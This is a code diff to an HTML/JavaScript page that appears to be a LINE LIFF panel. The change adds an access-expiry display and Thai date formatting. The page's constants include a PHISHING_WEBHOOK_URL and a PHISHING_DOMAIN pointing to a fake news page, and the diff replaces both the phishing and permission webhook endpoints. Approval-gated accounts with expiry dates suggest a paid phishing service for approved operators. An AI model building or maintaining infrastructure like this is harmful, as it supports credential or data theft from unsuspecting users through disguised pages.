@@ -189,6 +189,21 @@
             align-items: center;
             font-size: 14px;
             color: var(--text-light);
+            margin-bottom: 4px; /* Add some space below status */
+        }
+
+        .user-info .user-expiry {
+            font-size: 13px;
+            color: var(--text-light);
+            margin-top: 5px; /* Space above expiry date */
+            padding-left: 20px; /* Align with status text */
+            position: relative;
+        }
+        .user-info .user-expiry i {
+            position: absolute;
+            left: 0;
+            top: 3px; /* Adjust icon vertical position */
+            color: var(--warning-color); /* Use warning color for expiry */
         }
 
         .badge {
@@ -667,6 +682,10 @@
                             <span><i class="fas fa-circle-info"></i> สถานะ:</span> <span id="userStatus">ตรวจสอบสิทธิ์...</span>
                             <span id="statusBadge" class="badge">รอตรวจสอบ</span>
                         </div>
+                        <!-- Add Expiry Date Display -->
+                        <div class="user-expiry" id="userExpiry" style="display: none;">
+                            <i class="fas fa-calendar-times"></i> หมดอายุ: <span id="expiryDateText"></span>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -734,6 +753,7 @@
         let pictureUrl = "";
         let isLiffInitialized = false;
         let userHasPermission = false;
+        let expirationDate = null; // Variable to store expiration date
         
         // ค่า Config สำคัญ
         const LIFF_ID = '2007231851-0DqwXxQg';
@@ -741,8 +761,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxr8ONzOMK914tSUG4aLG6iWq-WHh73IyRrWHbXtWK-VOHJRi4JZLVweE6Kq3TFiMM_/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxr8ONzOMK914tSUG4aLG6iWq-WHh73IyRrWHbXtWK-VOHJRi4JZLVweE6Kq3TFiMM_/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -774,24 +794,71 @@
                 document.getElementById('profileImage').src = pictureUrl;
                 document.getElementById('userInfoSection').style.display = 'block';
                 
-                // ตรวจสอบสิทธิ์ผู้ใช้
+                // ตรวจสอบสิทธิ์ผู้ใช้ (will now also fetch expirationDate)
                 userHasPermission = await checkUserPermission(userId);
-                
+
+                const expiryElement = document.getElementById('userExpiry');
+                const expiryTextElement = document.getElementById('expiryDateText');
+
                 if (userHasPermission) {
                     // มีสิทธิ์ใช้งาน
-                    document.getElementById('userStatus').textContent = 'ได้รับอนุมัติแล้ว';
+                    document.getElementById('userStatus').textContent = 'ได้รับอนุมัติแล้ว'; // Or use status from API if available
                     document.getElementById('statusBadge').textContent = 'อนุมัติแล้ว';
                     document.getElementById('statusBadge').className = 'badge approved';
                     enableForm();
+
+                    // แสดงวันหมดอายุถ้ามี
+                    const storedExpiry = localStorage.getItem('user_expiry_' + userId);
+                    if (storedExpiry && storedExpiry !== 'null') {
+                        expiryTextElement.textContent = formatThaiDateTime(storedExpiry); // Format the date
+                        expiryElement.style.display = 'block';
+                    } else {
+                        expiryElement.style.display = 'none'; // Hide if no expiry date
+                    }
+
                 } else {
-                    // ไม่มีสิทธิ์ใช้งาน
-                    document.getElementById('userStatus').textContent = 'รอการอนุมัติ';
-                    document.getElementById('statusBadge').textContent = 'รออนุมัติ';
-                    document.getElementById('statusBadge').className = 'badge pending';
-                    document.getElementById('permissionMessage').style.display = 'block';
+                    // ไม่มีสิทธิ์ใช้งาน (อาจจะรออนุมัติ หรือ หมดอายุ)
+                    const storedStatus = localStorage.getItem('user_status_' + userId) || 'รอการอนุมัติ';
+                    const storedExpiry = localStorage.getItem('user_expiry_' + userId);
+                    let isExpired = false;
+
+                    // Check if the reason for no permission is expiration
+                    if (storedExpiry && storedExpiry !== 'null') {
+                        try {
+                            // Attempt to parse the stored date string (DD/MM/YYYY HH:MM:SS)
+                            const parts = storedExpiry.match(/(\d{2})\/(\d{2})\/(\d{4})\s+(\d{2}):(\d{2}):(\d{2})/);
+                            if (parts) {
+                                const expiryDateObj = new Date(parts[3], parts[2] - 1, parts[1], parts[4], parts[5], parts[6]);
+                                if (!isNaN(expiryDateObj) && expiryDateObj < new Date()) {
+                                    isExpired = true;
+                                }
+                            }
+                        } catch (e) { console.error("Error parsing stored expiry date:", e); }
+                    }
+
+
+                    if (isExpired) {
+                        document.getElementById('userStatus').textContent = 'หมดอายุการใช้งาน';
+                        document.getElementById('statusBadge').textContent = 'หมดอายุ';
+                        document.getElementById('statusBadge').className = 'badge pending'; // Or a new 'expired' class
+                        document.getElementById('permissionMessage').innerHTML = '<p>บัญชีของคุณหมดอายุการใช้งานแล้ว กรุณาติดต่อผู้ดูแลระบบ</p>';
+                        document.getElementById('permissionMessage').style.display = 'block';
+                        if (storedExpiry && storedExpiry !== 'null') {
+                             expiryTextElement.textContent = formatThaiDateTime(storedExpiry);
+                             expiryElement.style.display = 'block';
+                        }
+                    } else {
+                        // Not expired, likely pending approval
+                        document.getElementById('userStatus').textContent = storedStatus; // Use stored status
+                        document.getElementById('statusBadge').textContent = 'รออนุมัติ';
+                        document.getElementById('statusBadge').className = 'badge pending';
+                        document.getElementById('permissionMessage').innerHTML = '<p>กรุณารอการอนุมัติจากผู้ดูแลระบบก่อนใช้งาน หากคุณยังไม่ได้ลงทะเบียน สามารถพิมพ์คำสั่ง <strong>#regis</strong> ในแชทส่วนตัวกับบอท</p>';
+                        document.getElementById('permissionMessage').style.display = 'block';
+                        expiryElement.style.display = 'none'; // Hide expiry if pending
+                    }
                     disableForm();
                 }
-                
+
                 isLiffInitialized = true;
                 
                 // ตรวจสอบพารามิเตอร์ caseName จาก URL
@@ -826,12 +893,14 @@
                     const savedPermission = localStorage.getItem('user_permission_' + userId);
                     const savedTime = parseInt(localStorage.getItem('user_permission_time_' + userId) || '0');
                     const currentTime = new Date().getTime();
-                    
+                    const savedExpiry = localStorage.getItem('user_expiry_' + userId); // Get saved expiry
+
                     // ถ้าข้อมูลไม่เกิน 15 นาที ให้ใช้ค่าจาก localStorage (ลดจาก 30 นาที เหลือ 15 นาที)
                     if (savedPermission && (currentTime - savedTime < 15 * 60 * 1000)) {
                         console.log("ใช้ข้อมูลสิทธิ์จาก localStorage");
                         statusEl.textContent = originalText;
-                        return resolve(savedPermission === 'true');
+                        expirationDate = savedExpiry; // Restore expiry date from storage
+                        return Promise.resolve(savedPermission === 'true'); // Use Promise.resolve
                     }
                 } catch (e) {
                     console.error('ไม่สามารถอ่านข้อมูลจาก localStorage:', e);
@@ -850,15 +919,19 @@
                         if (data && typeof data === 'object') {
                             console.log("สถานะสิทธิ์จาก API:", data.hasPermission);
                             console.log("ข้อความสถานะจาก API:", data.userStatus || "ไม่ได้ระบุ");
+                            console.log("วันหมดอายุจาก API:", data.expirationDate); // Log expiry date
                             
-                            // บันทึกสิทธิ์ใน localStorage
+                            // บันทึกสิทธิ์และวันหมดอายุใน localStorage
                             try {
                                 localStorage.setItem('user_permission_' + userId, data.hasPermission ? 'true' : 'false');
                                 localStorage.setItem('user_permission_time_' + userId, new Date().getTime().toString());
-                                // บันทึกข้อความสถานะด้วยถ้ามี
                                 if (data.userStatus) {
                                     localStorage.setItem('user_status_' + userId, data.userStatus);
                                 }
+                                // Store expiration date (even if null)
+                                localStorage.setItem('user_expiry_' + userId, data.expirationDate);
+                                expirationDate = data.expirationDate; // Update global variable
+
                             } catch (e) {
                                 console.error('ไม่สามารถบันทึกข้อมูลใน localStorage:', e);
                             }
@@ -1541,6 +1614,53 @@
         // สร้าง ID เฉพาะสำหรับการส่งข้อมูล
         function generateUniqueId() {
             return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+        }
+
+        // ฟังก์ชันสำหรับฟอร์แมตวันที่เวลาให้เป็นภาษาไทย (Add this function)
+        function formatThaiDateTime(dateTimeStr) {
+            if (!dateTimeStr || dateTimeStr === 'null') return "ไม่มีกำหนด";
+
+            try {
+                let date;
+                // ตรวจสอบรูปแบบวันที่ DD/MM/YYYY HH:MM:SS
+                const parts = dateTimeStr.match(/(\d{2})\/(\d{2})\/(\d{4})\s+(\d{2}):(\d{2}):(\d{2})/);
+
+                if (parts) {
+                    // parts[3] = year, parts[2] = month (1-based), parts[1] = day
+                    // parts[4] = hour, parts[5] = minute, parts[6] = second
+                    // Note: Month in JavaScript Date is 0-indexed, so subtract 1
+                    date = new Date(parts[3], parts[2] - 1, parts[1], parts[4], parts[5], parts[6]);
+                } else {
+                    // Fallback for ISO or other formats if needed
+                    date = new Date(dateTimeStr);
+                }
+
+
+                // ตรวจสอบว่า date เป็นวันที่ที่ถูกต้องหรือไม่
+                if (isNaN(date.getTime())) {
+                    console.warn("Invalid date format received for formatting:", dateTimeStr);
+                    return dateTimeStr; // วันที่ไม่ถูกต้อง ส่งคืนสตริงเดิม
+                }
+
+                // ฟอร์แมตวันที่เวลาในรูปแบบไทย
+                const thaiMonths = [
+                    "ม.ค.", "ก.พ.", "มี.ค.", "เม.ย.", "พ.ค.", "มิ.ย.",
+                    "ก.ค.", "ส.ค.", "ก.ย.", "ต.ค.", "พ.ย.", "ธ.ค."
+                ];
+
+                const day = date.getDate();
+                const month = thaiMonths[date.getMonth()];
+                const year = date.getFullYear(); // แสดงปี ค.ศ.
+
+                const hours = date.getHours().toString().padStart(2, '0');
+                const minutes = date.getMinutes().toString().padStart(2, '0');
+                // const seconds = date.getSeconds().toString().padStart(2, '0'); // ไม่แสดงวินาที
+
+                return `${day} ${month} ${year} ${hours}:${minutes} น.`;
+            } catch (error) {
+                console.error("ข้อผิดพลาดในการแปลงรูปแบบวันที่:", error, "Original string:", dateTimeStr);
+                return dateTimeStr; // ส่งคืนสตริงเดิมในกรณีที่มีข้อผิดพลาด
+            }
         }
     </script>
 </body>
